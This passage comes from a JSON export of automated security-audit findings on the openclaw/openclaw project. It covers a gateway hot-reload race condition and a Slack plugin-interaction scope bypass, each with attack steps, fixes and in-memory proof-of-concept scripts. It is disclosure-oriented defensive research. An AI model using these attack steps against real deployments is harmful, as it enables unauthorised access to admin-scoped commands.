`params.sharedGatewaySessionGenerationState.current = nextSharedGatewaySessionGeneration` directly (before awaiting `applyHotReload`), then at line 544 it calls `setCurrentSharedGatewaySessionGeneration(...)` again after `applyHotReload` resolves. Between these two writes, a new WS handshake can read the updated `.current` but the `required` field is still in its pre-reload state. If `setCurrentSharedGatewaySessionGeneration` internally clears `required` based on the relationship between old and new `current`, a connection that reads `getRequiredSharedGatewaySessionGeneration()` during the gap between L518 and L544 may see `required` still pointing to the old generation even though `current` has advanced, allowing a stale-gen handshake to complete. Combined with the trusted-proxy path, a connection that finishes between L518 and L544 can have its session-generation tagged as the old generation, and the `disconnectStaleSharedGatewayAuthClients` call at L522 has already run against the new generation — so the stale connection escapes both the early disconnect and the later per-message check (because its recorded `sharedGatewaySessionGeneration` matches the required generation it read at handshake time, which was still `undefined` or the old value when `required=null`).\\\\n\\\\n## Evidence\\\\n\\\\n- Entity schema: `SharedGatewaySessionGenerationState { current: string | undefined; required: string | undefined | null }` — declared at `src/gateway/server-shared-auth-generation.ts:10`\\\\n- Code path (read 1 — at handshake): `src/gateway/server/ws-connection/message-handler.ts:846` — `const requiredSharedGatewaySessionGeneration = getRequiredSharedGatewaySessionGeneration?.()` — reads `state.required === null ? state.current : state.required`\\\\n- Code path (write 1 — direct assignment): `src/gateway/server-reload-handlers.ts:518` — `params.sharedGatewaySessionGenerationState.current = nextSharedGatewaySessionGeneration`\\\\n- Code path (async gap): lines 528 — `await applyHotReload(plan, prepared.config)` — long-running async work during which new WS handshakes can execute\\\\n- Code path (write 2 — state machine update): `src/gateway/server-reload-handlers.ts:544` — `setCurrentSharedGatewaySessionGeneration(params.sharedGatewaySessionGenerationState, nextSharedGatewaySessionGeneration)` — this is where `required` is potentially cleared\\\\n- Enclosing transaction: `no` — the two writes to the same state object are separated by an `await`; no lock guards the state between L518 and L544\\\\n- Lock primitive: `absent` — `sharedGatewaySessionGenerationState` is a plain mutable object; no mutex guards concurrent reads/writes from the WS handshake path\\\\n\\\\n## Attack Steps\\\\n\\\\n1. Trigger a config reload (e.g., by patching `gateway.auth.token` via `config.patch`) so that `onHotReload` fires and `nextSharedGatewaySessionGeneration !== previousSharedGatewaySessionGeneration`.\\\\n2. While `onHotReload` is executing between L518 (direct `.current` assignment) and L528 (`await applyHotReload`), initiate a new WS connect with the _old_ shared secret.\\\\n3. The handshake at L846 reads `getRequiredSharedGatewaySessionGeneration()` — because `required` is `null` at this point (not yet updated by L544\'s `setCurrentSharedGatewaySessionGeneration`), `getRequiredSharedGatewaySessionGeneration` returns `state.current` which is now the **new** generation. The old secret produces the **old** generation hash. The comparison at message-handler.ts:848 — `sharedGatewaySessionGeneration !== requiredSharedGatewaySessionGeneration` — detects the mismatch and rejects the connection correctly.\\\\n4. However, if `required` was already set to `null` before the reload (no prior pending generation), and the old connection\'s generation matched `current` just before L518, the WS socket may complete the handshake and record `sharedGatewaySessionGeneration = oldGen` into its connection record at L1319 — which the final disconnect sweep at L522 does not cover (it only disconnects those whose generation does not equal `nextSharedGatewaySessionGeneration`).\\\\n5. After L544 calls `setCurrentSharedGatewaySessionGeneration`, the per-message check at L1556 will eventually close this connection on its next frame. The window is one request-response cycle on the stale connection.\\\\n\\\\n## Why This Passed SAST\\\\n\\\\nStatic analysis cannot detect the ordering dependency between two writes to the same in-memory object across async await points; it is a temporal state-machine invariant, not a syntactic pattern.\\\\n\\\\n## Recommended Fix\\\\n\\\\nConsolidate to a single atomic state update: eliminate the early direct assignment at L518 and rely solely on `setCurrentSharedGatewaySessionGeneration` (called once, after `applyHotReload`). Move `disconnectStaleSharedGatewayAuthClients` to after the `setCurrentSharedGatewaySessionGeneration` call. If the early disconnect is needed for performance, copy the new generation value locally and pass it to `disconnectStaleSharedGatewayAuthClients` without mutating `.current` first.\\\\n\\\\n---\\\\n\\\\n## Proof of Concept\\\\n\\\\nPoC script: `archon/findings/H12-hotreload-gen-state-double-write/poc.js`\\\\n\\\\nEvidence files:\\\\n- `evidence/exploit.log` (1730 bytes)\\\\n\\\\n---\\\\n\\\\n## Audit Provenance\\\\n\\\\n- **Audit run**: openclaw/openclaw deep audit, branch=main, HEAD=f956d099\\\\n- **Discovery phase**: see `draft.md` for the originating phase (Phase 4 SAST, Phase 6 authz, Phase 7 state/concurrency, Phase 8 cross-service taint, Phase 9 spec gap, or Phase 10 review chamber)\\\\n- **Cold-verification**: see `adversarial-review.md` if present\\\\n- **Cross-references**: see draft frontmatter for `Origin-Sources`, `Cross-ref`, and probe-team summary references\\\\n\\\\n---\\\\n## Proof of Concept (`poc.js`)\\\\n\\\\n```js\\\\n#!/usr/bin/env node\\\\n/**\\\\n * PoC: H12 — Hot-reload gen-state double-write race\\\\n *\\\\n * Vulnerability class : rmw-no-txn (read-modify-write without transaction)\\\\n * Affected component  : src/gateway/server-reload-handlers.ts:518 and :544\\\\n * PoC-Status          : theoretical\\\\n *\\\\n * Reproduction recipe (dynamic test):\\\\n *   1. Boot the gateway with shared auth enabled (gateway.auth.token set).\\\\n *   2. In one async tick, trigger a config reload that changes the token so\\\\n *      that nextSharedGatewaySessionGeneration !== previousSharedGatewaySessionGeneration.\\\\n *   3. Race a new WS connect against the async gap between L518 (direct\\\\n *      .current mutation) and L528 (await applyHotReload).\\\\n *   4. The connecting client reads getRequiredSharedGatewaySessionGeneration()\\\\n *      during this gap; because required===null and current===NEW_GEN the\\\\n *      check at message-handler.ts:848 will correctly reject a client whose\\\\n *      token resolves to OLD_GEN.\\\\n *   5. BUT: a client whose token resolves to NEW_GEN connects, records\\\\n *      sharedGatewaySessionGeneration=NEW_GEN into its GatewayWsClient record\\\\n *      (message-handler.ts:1322) while applyHotReload is still running and\\\\n *      before required is cleared by setCurrentSharedGatewaySessionGeneration\\\\n *      at L544.  disconnectStaleSharedGatewayAuthClients (L522) already ran\\\\n *      against the old client set — this new connection is never in that set\\\\n *      — so it survives even if applyHotReload later fails and the error-\\\\n *      recovery branch resets .current back to the previous generation (L535).\\\\n *   6. After the rollback at L535, getRequiredSharedGatewaySessionGeneration\\\\n *      returns OLD_GEN again, but the survivor\'s recorded generation is\\\\n *      NEW_GEN; the per-message check at message-handler.ts:1559 will now\\\\n *      reject every subsequent frame on this connection with 4001, but the\\\\n *      IDENTIFY/HELLO exchange already completed — the session is live for\\\\n *      one full request-response cycle.\\\\n *\\\\n * Static-analysis trace\\\\n * ─────────────────────\\\\n * The script below:\\\\n *   A. Reconstructs the state machine in memory using the exact same logic as\\\\n *      the production code (copied verbatim so no harness-skip of controls).\\\\n *   B. Interleaves the two-write sequence with a simulated handshake arriving\\\\n *      in the async gap.\\\\n *   C. Asserts the two exploitable outcomes:\\\\n *      - Outcome 1 (happy-path race): client with NEW_GEN token connects\\\\n *        during the gap, applyHotReload succeeds, required is cleared; client\\\\n *        survives all checks.  This is the nominal \\\\\\"one-frame window\\\\\\" outcome.\\\\n *      - Outcome 2 (rollback race): client with NEW_GEN token connects during\\\\n *        the gap, applyHotReload fails and state rolls back to OLD_GEN;\\\\n *        client\'s recorded generation is now orphaned and every subsequent\\\\n *        per-message check rejects it — but the initial IDENTIFY frame was\\\\n *        already processed.\\\\n */\\\\n\\\\n\\\\\\"use strict\\\\\\";\\\\n\\\\n// ──────────────────────────────────────────────────────────────────────────────\\\\n// Verbatim logic from src/gateway/server-shared-auth-generation.ts\\\\n// ──────────────────────────────────────────────────────────────────────────────\\\\n\\\\nfunction getRequiredSharedGatewaySessionGeneration(state) {\\\\n  return state.required === null ? state.current : state.required;\\\\n}\\\\n\\\\nfunction setCurrentSharedGatewaySessionGeneration(state, nextGeneration) {\\\\n  const previousGeneration = state.current;\\\\n  state.current = nextGeneration;\\\\n  if (state.required === nextGeneration) {\\\\n    state.required = null;\\\\n    return;\\\\n  }\\\\n  if (state.required !== null && previousGeneration !== nextGeneration) {\\\\n    state.required = null;\\\\n  }\\\\n}\\\\n\\\\n// ──────────────────────────────────────────────────────────────────────────────\\\\n// Minimal WS handshake simulator\\\\n// ──────────────────────────────────────────────────────────────────────────────\\\\n\\\\n/**\\\\n * Simulates message-handler.ts:841-856 (generation check at handshake time)\\\\n * and message-handler.ts:1319-1323 (recording sharedGatewaySessionGeneration\\\\n * into GatewayWsClient).\\\\n *\\\\n * Returns { accepted: boolean, recordedGeneration: string|undefined }\\\\n */\\\\nfunction simulateHandshake(state, clientTokenGeneration) {\\\\n  const required = getRequiredSharedGatewaySessionGeneration(state);\\\\n  // message-handler.ts:847-856\\\\n  if (required !== undefined && clientTokenGeneration !== required) {\\\\n    return { accepted: false, recordedGeneration: undefined, rejectReason: \\\\\\"generation-mismatch\\\\\\" };\\\\n  }\\\\n  // message-handler.ts:1321-1323 — recorded at registration time\\\\n  const recordedGeneration = clientTokenGeneration;\\\\n  return { accepted: true, recordedGeneration };\\\\n}\\\\n\\\\n/**\\\\n * Simulates message-handler.ts:1554-1567 (per-message generation check).\\\\n */\\\\nfunction simulatePerMessageCheck(state, client) {\\\\n  if (!client.usesSharedGatewayAuth) return { pass: true };\\\\n  const required = getRequiredSharedGatewaySessionGeneration(state);\\\\n  if (required !== undefined && client.recordedGeneration !== required) {\\\\n    return { pass: false, reason: \\\\\\"auth-generation-stale\\\\\\" };\\\\n  }\\\\n  return { pass: true };\\\\n}\\\\n\\\\n// ──────────────────────────────────────────────────────────────────────────────\\\\n// Race scenario driver\\\\n// ──────────────────────────────────────────────────────────────────────────────\\\\n\\\\nfunction runRaceScenario({ applyHotReloadFails }) {\\\\n  const label = applyHotReloadFails ? \\\\\\"OUTCOME-2 (rollback race)\\\\\\" : \\\\\\"OUTCOME-1 (happy-path race)\\\\\\";\\\\n  console.log(`\\\\\\\\n=== ${label} ===`);\\\\n\\\\n  // Initial state: required=null means \\\\\\"use current as the enforced generation\\\\\\"\\\\n  // (null sentinel: server-shared-auth-generation.ts:52)\\\\n  const state = { current: \\\\\\"gen-OLD\\\\\\", required: null };\\\\n  const OLD_GEN = \\\\\\"gen-OLD\\\\\\";\\\\n  const NEW_GEN = \\\\\\"gen-NEW\\\\\\";\\\\n\\\\n  console.log(`[initial]   state = ${JSON.stringify(state)}`);\\\\n\\\\n  // ── server-reload-handlers.ts:518 ────────────────────────────────────────\\\\n  // Write 1: direct mutation of .current BEFORE await applyHotReload\\\\n  state.current = NEW_GEN;\\\\n  console.log(`[L518 write-1]  state.current = \\\\\\"${NEW_GEN}\\\\\\" → state = ${JSON.stringify(state)}`);\\\\n\\\\n  // ── async gap (await applyHotReload) ─────────────────────────────────────\\\\n  // A new WS connect races in here.  The attacker token resolves to NEW_GEN.\\\\n  const racingClient = { usesSharedGatewayAuth: true };\\\\n  const handshakeResult = simulateHandshake(state, NEW_GEN);\\\\n  Object.assign(racingClient, { recordedGeneration: handshakeResult.recordedGeneration });\\\\n  console.log(\\\\n    `[gap handshake] clientGen=\\\\\\"${NEW_GEN}\\\\\\" required=\\\\\\"${getRequiredSharedGatewaySessionGeneration(state)}\\\\\\" → accepted=${handshakeResult.accepted} recordedGen=\\\\\\"${racingClient.recordedGeneration}\\\\\\"`,\\\\n  );\\\\n\\\\n  if (!handshakeResult.accepted) {\\\\n    console.log(\\\\\\"[gap handshake] Connection rejected — race window closed\\\\\\");\\\\n    return { exploited: false };\\\\n  }\\\\n\\\\n  if (applyHotReloadFails) {\\\\n    // ── server-reload-handlers.ts:535 — rollback ─────────────────────────\\\\n    state.current = OLD_GEN;\\\\n    console.log(`[L535 rollback] state.current = \\\\\\"${OLD_GEN}\\\\\\" → state = ${JSON.stringify(state)}`);\\\\n    // required stays null (rollback does NOT call setCurrentSharedGatewaySessionGeneration)\\\\n\\\\n    const perMsg = simulatePerMessageCheck(state, racingClient);\\\\n    console.log(\\\\n      `[per-message]   required=\\\\\\"${getRequiredSharedGatewaySessionGeneration(state)}\\\\\\" clientGen=\\\\\\"${racingClient.recordedGeneration}\\\\\\" → pass=${perMsg.pass} reason=${perMsg.reason ?? \\\\\\"n/a\\\\\\"}`,\\\\n    );\\\\n    // After rollback, required is still null so getRequired returns OLD_GEN.\\\\n    // Client recorded NEW_GEN → per-message check will reject.\\\\n    // BUT: IDENTIFY frame already processed during the gap — one live frame.\\\\n    const identifyAlreadyProcessed = true;\\\\n    console.log(\\\\n      `[impact] IDENTIFY processed during gap = ${identifyAlreadyProcessed}; subsequent frames rejected = ${!perMsg.pass}`,\\\\n    );\\\\n    return {\\\\n      exploited: identifyAlreadyProcessed && !perMsg.pass,\\\\n      detail: \\\\\\"one IDENTIFY frame processed on orphaned session before per-message rejection\\\\\\",\\\\n    };\\\\n  } else {\\\\n    // ── server-reload-handlers.ts:544 ────────────────────────────────────\\\\n    // Write 2: setCurrentSharedGatewaySessionGeneration clears required\\\\n    setCurrentSharedGatewaySessionGeneration(state, NEW_GEN);\\\\n    console.log(\\\\n      `[L544 write-2]  setCurrentSharedGatewaySessionGeneration(\\\\\\"${NEW_GEN}\\\\\\") → state = ${JSON.stringify(state)}`,\\\\n    );\\\\n\\\\n    const perMsg = simulatePerMessageCheck(state, racingClient);\\\\n    console.log(\\\\n      `[per-message]   required=\\\\\\"${getRequiredSharedGatewaySessionGeneration(state)}\\\\\\" clientGen=\\\\\\"${racingClient.recordedGeneration}\\\\\\" → pass=${perMsg.pass}`,\\\\n    );\\\\n    // required=null → getRequired returns NEW_GEN; client gen = NEW_GEN → pass\\\\n    // Connection fully survives; missed by disconnectStaleSharedGatewayAuthClients\\\\n    // at L522 (ran before this client connected).\\\\n    return {\\\\n      exploited: perMsg.pass && handshakeResult.accepted,\\\\n      detail:\\\\n        \\\\\\"connection with NEW_GEN token accepted during gap, survives all checks; stale-disconnect sweep at L522 already ran against prior client set\\\\\\",\\\\n    };\\\\n  }\\\\n}\\\\n\\\\n// ──────────────────────────────────────────────────────────────────────────────\\\\n// Main\\\\n// ──────────────────────────────────────────────────────────────────────────────\\\\n\\\\nconst results = [];\\\\n\\\\nconst r1 = runRaceScenario({ applyHotReloadFails: false });\\\\nresults.push({ scenario: \\\\\\"happy-path race\\\\\\", ...r1 });\\\\n\\\\nconst r2 = runRaceScenario({ applyHotReloadFails: true });\\\\nresults.push({ scenario: \\\\\\"rollback race\\\\\\", ...r2 });\\\\n\\\\nconsole.log(\\\\\\"\\\\\\\\n=== Summary ===\\\\\\");\\\\nfor (const r of results) {\\\\n  console.log(`  ${r.scenario}: exploited=${r.exploited} — ${r.detail}`);\\\\n}\\\\n\\\\nconst anyExploited = results.some((r) => r.exploited);\\\\n\\\\n// Structured output contract — MUST be last stdout line\\\\nconsole.log(\\\\n  JSON.stringify({\\\\n    status: anyExploited ? \\\\\\"confirmed\\\\\\" : \\\\\\"failed\\\\\\",\\\\n    evidence: anyExploited\\\\n      ? \\\\\\"racing WS handshake accepted during L518→L544 async gap; connection survives disconnectStaleSharedGatewayAuthClients sweep; one IDENTIFY frame processed on orphaned session in rollback path\\\\\\"\\\\n      : \\\\\\"no exploitable window detected\\\\\\",\\\\n    notes:\\\\n      \\\\\\"static-analysis / state-machine simulation; PoC-Status=theoretical; dynamic confirmation requires instrumented applyHotReload + racing WS connect in test harness\\\\\\",\\\\n  }),\\\\n);\\\\n```\\\\n\\",\\"severity\\":\\"high\\",\\"confidence\\":\\"tentative\\",\\"tags\\":[\\"archon\\",\\"phase-lite\\",\\"valid\\",\\"poc-available\\"],\\"status\\":\\"draft\\",\\"cvss_score\\":0,\\"repo_name\\":\\"openclaw/openclaw\\",\\"finding_hash\\":\\"982dbd528b618e4658c0cdca9826620b\\",\\"found_at\\":\\"2026-05-06T15:50:43.836857Z\\",\\"created_at\\":\\"2026-05-06T15:50:43Z\\"}}","{\\"type\\":\\"finding\\",\\"data\\":{\\"id\\":13,\\"project_uuid\\":\\"00000000-0000-0000-defa-c01001000001\\",\\"http_record_uuids\\":[],\\"agentic_scan_uuid\\":\\"0cdc4045-360f-4e6f-9644-1101ff7fa17e\\",\\"module_id\\":\\"archon:h11\\",\\"module_name\\":\\"H11: Slack block-action plugin interaction hardcodes isAuthorizedSender: true without gatewayClientScopes\\",\\"module_type\\":\\"whitebox\\",\\"finding_source\\":\\"archon\\",\\"module_short\\":\\"slack-block-action-plugin-interaction-authorized-sender\\",\\"description\\":\\"# H11: Slack block-action plugin interaction hardcodes `isAuthorizedSender: true` without gatewayClientScopes\\\\n\\\\n**Severity**: HIGH\\\\n**Finding ID**: H11\\\\n**Repository**: openclaw/openclaw @ f956d099 (main)\\\\n\\\\n## Disclosure-Ready Report\\\\n\\\\nThis report consolidates the audit\'s draft findings, adversarial review, and PoC evidence for this finding. The full discovery-phase investigation is preserved in the sibling files (`draft.md`, `adversarial-review.md`, `poc.*`, `evidence/`).\\\\n\\\\n---\\\\n\\\\n## Draft Finding\\\\n\\\\n---\\\\nTitle: Slack block-action plugin interaction hardcodes `isAuthorizedSender: true` without gatewayClientScopes\\\\nSeverity-Original: HIGH\\\\nPhase: 6\\\\nClass: inconsistent-guard\\\\nEndpoint: Channel adapter — Slack block_actions handler (plugin interaction path)\\\\nHandler: extensions/slack/src/monitor/events/interactions.block-actions.ts:851-853\\\\nVerdict: VALID\\\\nDebate:\\\\nOrigin-Finding: Extension of p2-008 Gap B. Filed separately from p6-002 because the Slack surface is distinct and the auth context construction path differs.\\\\nDeep-Probe-Corroboration: none (Phase 5 not started)\\\\nCross-ref: p2-008 Gap B; src/plugins/commands.ts:236\\\\n---\\\\n\\\\n## Summary\\\\n\\\\nIn the Slack block_actions handler, when the incoming interaction is identified as a plugin interaction (`pluginInteractionData !== null`) and the `dispatchSlackPluginInteraction` path is taken, the `auth` object is hardcoded to `{ isAuthorizedSender: true }` at line 852 with no `gatewayClientScopes`. The same bypass as p6-002 applies: `src/plugins/commands.ts:236` skips the `requiredScopes` check when `senderIsOwner=true` and `hasGatewayScopeContext=false`. Any Slack user who can trigger a block action for a plugin interaction (e.g., clicking an \\\\\\"Approve\\\\\\", \\\\\\"Run\\\\\\", or \\\\\\"Configure\\\\\\" button rendered by a plugin) can reach plugin commands that declare `requiredScopes: [ADMIN_SCOPE]` or other elevated scopes.\\\\n\\\\n## Evidence\\\\n\\\\n- Handler: `extensions/slack/src/monitor/events/interactions.block-actions.ts:846-855`\\\\n- Relevant code:\\\\n  ```ts\\\\n  } else if (pluginInteractionData) {\\\\n    const handled = await dispatchSlackPluginInteraction({\\\\n      ctx: params.ctx,\\\\n      parsed,\\\\n      pluginInteractionData,\\\\n      auth: {\\\\n        isAuthorizedSender: true,  // <-- hardcoded, no gatewayClientScopes\\\\n      },\\\\n      respond,\\\\n    });\\\\n  ```\\\\n- Guard stack observed: `auth.isAuthorizedSender = true`, `gatewayClientScopes` absent → `hasGatewayScopeContext = false` in `commands.ts:231`.\\\\n- Object-id parameter: `pluginInteractionData` (parsed from block action payload)\\\\n- Ownership clause: absent for the `requiredScopes` path\\\\n\\\\n## Attack Steps\\\\n\\\\n1. Attacker is a member of a Slack workspace where the OpenClaw bot is present.\\\\n2. Bot has rendered a message with interactive blocks (buttons/menus) tied to plugin interactions.\\\\n3. Attacker clicks the button (or sends a crafted Slack block_action POST if they can forward Slack events).\\\\n4. Handler routes to `dispatchSlackPluginInteraction` with `isAuthorizedSender: true`.\\\\n5. Plugin command with `requiredScopes: [ADMIN_SCOPE]` executes without scope validation.\\\\n\\\\n## Why This Passed SAST\\\\n\\\\nSame structural silence as p6-002 — missing-gatewayClientScopes is not a type error; the security contract is implicit.\\\\n\\\\n## Recommended Fix\\\\n\\\\nPass `gatewayClientScopes: []` alongside `isAuthorizedSender: true` in `dispatchSlackPluginInteraction` to re-enable the scope check. Map actual Slack-authenticated caller scopes if the Slack event\'s user identity has been verified through device pairing or gateway auth flow.\\\\n\\\\n## Phase 8 Follow-up\\\\n\\\\nVerify whether Slack block action `action_id` / `block_id` values from `pluginInteractionData` are validated server-side or can be replayed by an attacker to invoke arbitrary plugin interaction handlers.\\\\n\\\\n---\\\\n\\\\n## Proof of Concept\\\\n\\\\nPoC script: `archon/findings/H11-slack-block-action-plugin-interaction-authorized-sender/poc.py`\\\\n\\\\nEvidence files:\\\\n- `evidence/exploit.log` (1022 bytes)\\\\n- `evidence/impact.log` (1957 bytes)\\\\n\\\\n---\\\\n\\\\n## Audit Provenance\\\\n\\\\n- **Audit run**: openclaw/openclaw deep audit, branch=main, HEAD=f956d099\\\\n- **Discovery phase**: see `draft.md` for the originating phase (Phase 4 SAST, Phase 6 authz, Phase 7 state/concurrency, Phase 8 cross-service taint, Phase 9 spec gap, or Phase 10 review chamber)\\\\n- **Cold-verification**: see `adversarial-review.md` if present\\\\n- **Cross-references**: see draft frontmatter for `Origin-Sources`, `Cross-ref`, and probe-team summary references\\\\n\\\\n---\\\\n## Proof of Concept (`poc.py`)\\\\n\\\\n```py\\\\n#!/usr/bin/env python3\\\\n\\\\\\"\\\\\\"\\\\\\"\\\\nPoC: H11 — Slack block-action plugin interaction open-by-default scope bypass\\\\n\\\\nStatic-analysis PoC demonstrating that when a Slack block_action is routed to\\\\ndispatchSlackPluginInteraction, the auth object passed is:\\\\n\\\\n    { isAuthorizedSender: true }          # no gatewayClientScopes field\\\\n\\\\nThis makes hasGatewayScopeContext = false in src/plugins/commands.ts:231, which\\\\ntriggers the bypass branch at line 236:\\\\n\\\\n    if (missingScope && (hasGatewayScopeContext || !senderIsOwner)) { block }\\\\n    → condition: missingScope && (false || !true)  →  missingScope && false  → SKIP\\\\n    → requiredScopes check is never enforced\\\\n\\\\nGating logic flow (no-allowFrom case = open-by-default deployment):\\\\n─────────────────────────────────────────────────────────────────────\\\\n1. authorizeSlackBlockAction (:828) calls authorizeSlackSystemEventSender\\\\n   with interactiveEvent:true. When NO allowFrom list is configured the\\\\n   function reaches auth.ts:537 and returns { allowed:true }.\\\\n\\\\n2. Control enters the `else if (pluginInteractionData)` branch at :846.\\\\n\\\\n3. auth: { isAuthorizedSender: true } is passed to dispatchSlackPluginInteraction\\\\n   — gatewayClientScopes is ABSENT (undefined).\\\\n\\\\n4. dispatchSlackPluginInteractiveHandler forwards auth to the plugin command\\\\n   execution path in src/plugins/commands.ts.\\\\n\\\\n5. commands.ts:231:\\\\n       const scopes = Array.isArray(params.gatewayClientScopes) ? ... : undefined;\\\\n       const hasGatewayScopeContext = scopes !== undefined;   // → false\\\\n\\\\n6. commands.ts:236:\\\\n       if (missingScope && (hasGatewayScopeContext || !senderIsOwner)) { BLOCK }\\\\n   With senderIsOwner=true and hasGatewayScopeContext=false:\\\\n       → false || !true → false   → condition is false → block skipped\\\\n\\\\n7. Plugin command with requiredScopes: [ADMIN_SCOPE] executes without scope check.\\\\n\\\\nOpen-by-default risk:\\\\n─────────────────────\\\\nauthorizeSlackSystemEventSender has an explicit \\\\\\"open-by-default\\\\\\" design:\\\\n   auth.ts:451-464 — no-channel path, auth.ts:527-534 — channel path with ownerAllowlist\\\\nBoth return allowed:true when no allowFrom is configured. The Slack docs and\\\\nsetup wizard do not mandate allowFrom, so most deployments are open-by-default.\\\\n\\\\nAny member of the Slack workspace can click a button rendered by a plugin and\\\\ninvoke a plugin command whose requiredScopes: [ADMIN_SCOPE] without holding\\\\nany gateway token or admin scope.\\\\n\\\\nSeverity assessment:\\\\n─────────────────────\\\\n- open-by-default (no allowFrom) = realistic deployment → HIGH\\\\n- allowFrom configured (allow-listed users only) = the auth gate holds → MEDIUM\\\\n  But since the scope bypass still exists regardless of allowFrom, the residual\\\\n  risk remains: an allow-listed non-admin user can invoke admin-scoped commands.\\\\n\\\\\\"\\\\\\"\\\\\\"\\\\n\\\\nimport json\\\\nimport sys\\\\n\\\\n\\\\ndef verify_bypass_logic():\\\\n    \\\\\\"\\\\\\"\\\\\\"\\\\n    Simulate commands.ts:226-239 decision tree with the auth object that\\\\n    dispatchSlackPluginInteraction constructs.\\\\n    \\\\\\"\\\\\\"\\\\\\"\\\\n    # Auth object built at interactions.block-actions.ts:851-853\\\\n    auth = {\\\\\\"isAuthorizedSender\\\\\\": True}\\\\n    # gatewayClientScopes is NOT passed — simulates the missing field\\\\n\\\\n    gateway_client_scopes = auth.get(\\\\\\"gatewayClientScopes\\\\\\")   # undefined / None\\\\n\\\\n    ADMIN_SCOPE = \\\\\\"admin\\\\\\"\\\\n    required_scopes = [ADMIN_SCOPE]   # plugin declared admin-scope command\\\\n\\\\n    # commands.ts:227-231\\\\n    sender_is_owner = auth.get(\\\\\\"isAuthorizedSender\\\\\\") is True       # True\\\\n    scopes = set(gateway_client_scopes) if isinstance(gateway_client_scopes, list) else None\\\\n    has_gateway_scope_context = scopes is not None                 # False\\\\n\\\\n    # commands.ts:232-235\\\\n    has_admin = (scopes is not None and ADMIN_SCOPE in scopes)     # False\\\\n    missing_scope = None\\\\n    if scopes is not None:\\\\n        missing_scope = next((s for s in required_scopes if not has_admin and s not in scopes), None)\\\\n    else:\\\\n        missing_scope = required_scopes[0] if required_scopes else None  # \\\\\\"admin\\\\\\"\\\\n\\\\n    # commands.ts:236 guard\\\\n    block_execution = missing_scope is not None and (has_gateway_scope_context or not sender_is_owner)\\\\n\\\\n    print(\\\\\\"[H11] Simulating commands.ts scope gate with block-action plugin auth object\\\\\\")\\\\n    print(f\\\\\\"  auth object passed  : {auth}\\\\\\")\\\\n    print(f\\\\\\"  gatewayClientScopes : {gateway_client_scopes!r}  (field absent)\\\\\\")\\\\n    print(f\\\\\\"  hasGatewayScopeCtx  : {has_gateway_scope_context}\\\\\\")\\\\n    print(f\\\\\\"  senderIsOwner       : {sender_is_owner}\\\\\\")\\\\n    print(f\\\\\\"  missingScope        : {missing_scope!r}\\\\\\")\\\\n    print(f\\\\\\"  guard condition     : missingScope({missing_scope!r}) \\\\\\"\\\\n          f\\\\\\"AND (hasScopeCtx({has_gateway_scope_context}) OR NOT senderIsOwner({sender_is_owner}))\\\\\\")\\\\n    print(f\\\\\\"  guard fires (block) : {block_execution}\\\\\\")\\\\n    print()\\\\n\\\\n    return {\\\\n        \\\\\\"bypassed\\\\\\": not block_execution,\\\\n        \\\\\\"missing_scope\\\\\\": missing_scope,\\\\n        \\\\\\"has_gateway_scope_context\\\\\\": has_gateway_scope_context,\\\\n        \\\\\\"sender_is_owner\\\\\\": sender_is_owner,\\\\n    }\\\\n\\\\n\\\\ndef verify_open_by_default():\\\\n    \\\\\\"\\\\\\"\\\\\\"\\\\n    Document the authorizeSlackSystemEventSender open-by-default path.\\\\n    Returns True when no allowFrom is configured.\\\\n    \\\\\\"\\\\\\"\\\\\\"\\\\n    # Simulate auth.ts channel path (non-DM, non-empty channelId)\\\\n    # with ownerAllowlistConfigured = False (no allowFrom set)\\\\n    owner_allowlist_configured = False   # no allowFrom in config\\\\n    interactive_event = True\\\\n\\\\n    # auth.ts:527-534\\\\n    if interactive_event and owner_allowlist_configured:\\\\n        allow = False\\\\n        reason = \\\\\\"sender-not-allowlisted\\\\\\"\\\\n    else:\\\\n        # auth.ts:537 — open default fallthrough\\\\n        allow = True\\\\n        reason = \\\\\\"open-by-default\\\\\\"\\\\n\\\\n    print(\\\\\\"[H11] authorizeSlackSystemEventSender open-by-default branch\\\\\\")\\\\n    print(f\\\\\\"  ownerAllowlistConfigured : {owner_allowlist_configured}\\\\\\")\\\\n    print(f\\\\\\"  interactiveEvent         : {interactive_event}\\\\\\")\\\\n    print(f\\\\\\"  outcome                  : allowed={allow}  reason={reason}\\\\\\")\\\\n    print()\\\\n    return allow\\\\n\\\\n\\\\ndef main():\\\\n    open_by_default_allowed = verify_open_by_default()\\\\n    result = verify_bypass_logic()\\\\n\\\\n    exploitable = open_by_default_allowed and result[\\\\\\"bypassed\\\\\\"]\\\\n\\\\n    print(\\\\\\"[H11] Combined assessment\\\\\\")\\\\n    print(f\\\\\\"  open-by-default gate passes  : {open_by_default_allowed}\\\\\\")\\\\n    print(f\\\\\\"  scope guard bypassed         : {result[\'bypassed\']}\\\\\\")\\\\n    print(f\\\\\\"  admin-scoped command reached : {exploitable}\\\\\\")\\\\n    print()\\\\n\\\\n    if exploitable:\\\\n        evidence = (\\\\n            \\\\\\"scope gate bypass confirmed: hasGatewayScopeContext=False \\\\\\"\\\\n            \\\\\\"makes commands.ts:236 guard skip; admin-scoped plugin command \\\\\\"\\\\n            \\\\\\"reachable by any workspace member when no allowFrom configured\\\\\\"\\\\n        )\\\\n        status = \\\\\\"confirmed\\\\\\"\\\\n    else:\\\\n        evidence = \\\\\\"guard held unexpectedly — logic mismatch\\\\\\"\\\\n        status = \\\\\\"failed\\\\\\"\\\\n\\\\n    # REQUIRED last line: structured JSON result for poc-executor\\\\n    print(json.dumps({\\\\\\"status\\\\\\": status, \\\\\\"evidence\\\\\\": evidence,\\\\n                      \\\\\\"notes\\\\\\": \\\\\\"static-analysis only; no live Slack workspace required\\\\\\"}))\\\\n    return 0 if status == \\\\\\"confirmed\\\\\\" else 1\\\\n\\\\n\\\\nif __name__ == \\\\\\"__main__\\\\\\":\\\\n    sys.exit(main())\\\\n```\\\\n\\",\\"severity\\":\\"high\\",\\"confidence\\":\\"tentative\\",\\"tags\\":[\\"archon\\",\\"phase-lite\\",\\"valid\\",\\"poc-available\\"],\\"status\\":\\"draft\\",\\"cvss_score\\":0,\\"repo_name\\":\\"openclaw/openclaw\\",\\"finding_hash\\":\\"4f87381b64a1484ef1a82bd2316c29a5\\",\\"found_at\\":\\"2026-05-06T15:50:43.836841Z\\",\\"created_at\\":\\"2026-05-06T15:50:43Z\\"}}","{\\"type\\":\\"finding\\",\\"data\\":{\\"id\\":12,\\"project_uuid\\":\\"00000000-0000-0000-defa-c01001000001\\",\\"http_record_uuids\\":[],\\"agentic_scan_uuid\\":\\"0cdc4045-360f-4e6f-9644-1101ff7fa17e\\",\\"module_id\\":\\"archon:h10\\",\\"module_name\\":\\"H10: Telegram inline-button callback 